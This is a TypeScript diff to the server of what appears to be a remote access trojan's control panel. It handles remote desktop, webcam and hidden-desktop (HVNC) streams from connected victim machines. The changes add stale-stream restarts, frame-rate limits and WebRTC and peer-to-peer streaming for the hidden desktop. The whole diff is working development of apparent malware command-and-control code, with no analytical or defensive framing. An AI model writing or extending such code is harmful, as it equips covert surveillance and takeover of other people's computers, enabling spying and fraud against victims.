@@ -170,6 +170,8 @@ export const rdStreamingState = new Map<string, {
   maxHeight: number;
   maxFps: number;
   lastFps: number;
+  lastFrameAt: number;
+  startedAt: number;
 }>();
 const rdInputPending = new Map<string, { clientId: string; sentAt: number; kind: string }>();
 const RD_INPUT_TTL_MS = 10_000;
@@ -183,7 +185,18 @@ function pruneRdInputPending(now = Date.now()) {
 }
 
 function defaultRdStreamingState() {
-  return { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0, maxFps: 120, lastFps: 0 };
+  return {
+    isStreaming: false,
+    display: 0,
+    quality: 90,
+    codec: "",
+    duplication: false,
+    maxHeight: 0,
+    maxFps: 120,
+    lastFps: 0,
+    lastFrameAt: 0,
+    startedAt: 0,
+  };
 }
 
 function clampDesktopFps(value: unknown): number {
@@ -379,10 +392,27 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         sendDesktopCommand(target, "desktop_set_fps", { fps: clampDesktopFps(state.maxFps) });
         sendDesktopCommand(target, "desktop_start", {});
         state.isStreaming = true;
+        state.startedAt = Date.now();
         rdStreamingState.set(clientId, state);
         logger.debug(`[rd-debug] desktop_start forwarded client=${clientId} nextState=${JSON.stringify(state)} webrtc=${(payload as any).webrtc === true}`);
       } else {
-        logger.warn(`[rd-debug] desktop_start ignored duplicate client=${clientId} state=${JSON.stringify(state)} viewers=${sessionManager.getRdSessionsForClient(clientId).length}`);
+        const lastFrameAgeMs = state.lastFrameAt ? Date.now() - state.lastFrameAt : Number.POSITIVE_INFINITY;
+        const startAgeMs = state.startedAt ? Date.now() - state.startedAt : Number.POSITIVE_INFINITY;
+        if (lastFrameAgeMs > 3000 && startAgeMs > 3000) {
+          logger.info(`[rd-debug] desktop_start reasserting stale stream client=${clientId} lastFrameAgeMs=${Number.isFinite(lastFrameAgeMs) ? lastFrameAgeMs : -1} state=${JSON.stringify(state)} viewers=${sessionManager.getRdSessionsForClient(clientId).length}`);
+          sendDesktopCommand(target, "desktop_set_fps", { fps: clampDesktopFps(state.maxFps) });
+          sendDesktopCommand(target, "desktop_start", {});
+          state.isStreaming = true;
+          state.startedAt = Date.now();
+          rdStreamingState.set(clientId, state);
+        } else {
+          logger.debug(`[rd-debug] desktop_start already active client=${clientId} lastFrameAgeMs=${lastFrameAgeMs} startAgeMs=${startAgeMs} state=${JSON.stringify(state)} viewers=${sessionManager.getRdSessionsForClient(clientId).length}`);
+          if (String(state.codec || "").toLowerCase() === "h264") {
+            sendDesktopCommand(target, "desktop_request_keyframe", {
+              reason: "viewer_start_existing_stream",
+            });
+          }
+        }
       }
       break;
     case "desktop_stop": {
@@ -395,10 +425,12 @@ export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>
         sendDesktopCommand(target, "webrtc_stop", { kind: "desktop" });
         if (state.isStreaming) {
           state.isStreaming = false;
+          state.startedAt = 0;
+          state.lastFrameAt = 0;
           rdStreamingState.set(clientId, state);
           logger.debug(`[rd] stopped streaming for client ${clientId}`);
         } else {
-          rdStreamingState.set(clientId, { ...state, isStreaming: false });
+          rdStreamingState.set(clientId, { ...state, isStreaming: false, startedAt: 0, lastFrameAt: 0 });
           logger.debug(`[rd] stop requested while not streaming for client ${clientId}`);
         }
       } else {
@@ -672,9 +704,11 @@ function handleRemoteDesktopFrame(payload: any) {
   const state = rdStreamingState.get(clientId) || defaultRdStreamingState();
   if (!state.isStreaming) {
     state.isStreaming = true;
+    state.startedAt = Date.now();
   }
   const frameFps = Number(header?.fps) || 0;
   if (frameFps > 0) state.lastFps = frameFps;
+  state.lastFrameAt = Date.now();
   rdStreamingState.set(clientId, state);
   const now = Date.now();
   const lastDebugFrameLog = rdDebugFrameLogAt.get(clientId) || 0;
@@ -690,6 +724,7 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
   if (frameFps > 0) {
     const state = rdStreamingState.get(clientId) || { ...defaultRdStreamingState(), isStreaming: true };
     state.lastFps = frameFps;
+    state.lastFrameAt = Date.now();
     rdStreamingState.set(clientId, state);
   }
   recordRemoteDesktopFrame(clientId, header, bytes);
@@ -703,7 +738,20 @@ function broadcastRemoteDesktopFrame(clientId: string, bytes: Uint8Array, header
   return broadcastRemoteDesktopFrame(clientId, bytes, header);
 };
 
-export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
+type HVNCStreamingState = {
+  isStreaming: boolean;
+  display: number;
+  quality: number;
+  codec: string;
+  maxFps: number;
+  lastFps: number;
+};
+
+function defaultHVNCStreamingState(): HVNCStreamingState {
+  return { isStreaming: false, display: 0, quality: 90, codec: "", maxFps: 120, lastFps: 0 };
+}
+
+export const hvncStreamingState = new Map<string, HVNCStreamingState>();
 export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();
 
 export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
@@ -1031,12 +1079,30 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
     return;
   }
 
-  const state = hvncStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "" };
+  const state = hvncStreamingState.get(clientId) || defaultHVNCStreamingState();
 
   logger.debug(`[hvnc] inbound viewer msg type=${payload.type} client=${clientId}`);
   switch (payload.type) {
     case "hvnc_start":
       if (!state.isStreaming) {
+        if ((payload as any).webrtc === true) {
+          const streamPath = webrtcStreamPathFor(clientId, "hvnc");
+          const token = issueWebrtcPublishToken(clientId);
+          sendHVNCCommand(target, "webrtc_publish", {
+            streamPath,
+            whipPath: `/api/webrtc/${streamPath}/whip`,
+            token,
+            kind: "hvnc",
+            hasVideo: true,
+            hasAudio: false,
+          });
+          safeSendViewer(ws, {
+            type: "webrtc_ready",
+            streamPath,
+            whepPath: `/api/webrtc/${streamPath}/whep`,
+          });
+        }
+        sendHVNCCommand(target, "hvnc_set_fps", { fps: clampDesktopFps(state.maxFps) });
         sendHVNCCommand(target, "hvnc_start", {
           autoStartExplorer: false,
         });
@@ -1053,6 +1119,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       if (otherHvncViewers.length === 0) {
         if (state.isStreaming) {
           sendHVNCCommand(target, "hvnc_stop", {});
+          sendHVNCCommand(target, "webrtc_stop", { kind: "hvnc" });
           state.isStreaming = false;
           hvncStreamingState.set(clientId, state);
           logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
@@ -1083,6 +1150,16 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
         state.codec = newCodec;
         hvncStreamingState.set(clientId, state);
         logger.debug(`[hvnc] set quality=${newQuality} codec=${newCodec || "(default)"}`);
+      }
+      break;
+    }
+    case "hvnc_set_fps": {
+      const newMaxFps = clampDesktopFps((payload as any).fps);
+      if (state.maxFps !== newMaxFps) {
+        sendHVNCCommand(target, "hvnc_set_fps", { fps: newMaxFps });
+        state.maxFps = newMaxFps;
+        hvncStreamingState.set(clientId, state);
+        logger.debug(`[hvnc] set target fps=${newMaxFps}`);
       }
       break;
     }
@@ -1229,6 +1306,34 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       sendDesktopCommand(target, "clipboard_sync_stop", {});
       break;
     }
+    case "webrtc_p2p_offer": {
+      const sdp = typeof (payload as any).sdp === "string" ? (payload as any).sdp : "";
+      if (!sdp) break;
+      const sessionId = createP2PSession(ws, clientId, "hvnc");
+      sendHVNCCommand(target, "webrtc_p2p_offer", { sessionId, sdp, kind: "hvnc", hasVideo: true, hasAudio: false });
+      break;
+    }
+    case "webrtc_p2p_ice": {
+      const sessionId = getP2PSessionIdForViewer(ws);
+      if (!sessionId) break;
+      const candidate = typeof (payload as any).candidate === "string" ? (payload as any).candidate : "";
+      if (!candidate) break;
+      sendHVNCCommand(target, "webrtc_p2p_ice", {
+        sessionId,
+        kind: "hvnc",
+        candidate,
+        sdpMid: typeof (payload as any).sdpMid === "string" ? (payload as any).sdpMid : "",
+        sdpMLineIndex: Number((payload as any).sdpMLineIndex) || 0,
+      });
+      break;
+    }
+    case "webrtc_p2p_stop": {
+      const cleared = clearP2PSessionForViewer(ws);
+      if (cleared) {
+        sendHVNCCommand(target, "webrtc_p2p_stop", { sessionId: cleared.sessionId, kind: cleared.kind });
+      }
+      break;
+    }
     default:
       break;
   }
@@ -1239,6 +1344,15 @@ export function sendHVNCCommand(target: ClientInfo, commandType: string, payload
 }
 
 (globalThis as any).__hvncBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
+  const state = hvncStreamingState.get(clientId) || defaultHVNCStreamingState();
+  if (!state.isStreaming) {
+    state.isStreaming = true;
+  }
+  const frameFps = Number(header?.fps) || 0;
+  if (frameFps > 0) {
+    state.lastFps = frameFps;
+  }
+  hvncStreamingState.set(clientId, state);
   const buf = buildViewerFrameBuffer(bytes, header);
   return broadcastFrameToViewers(sessionManager.getHvncSessionsForClient(clientId), buf, header);
 };
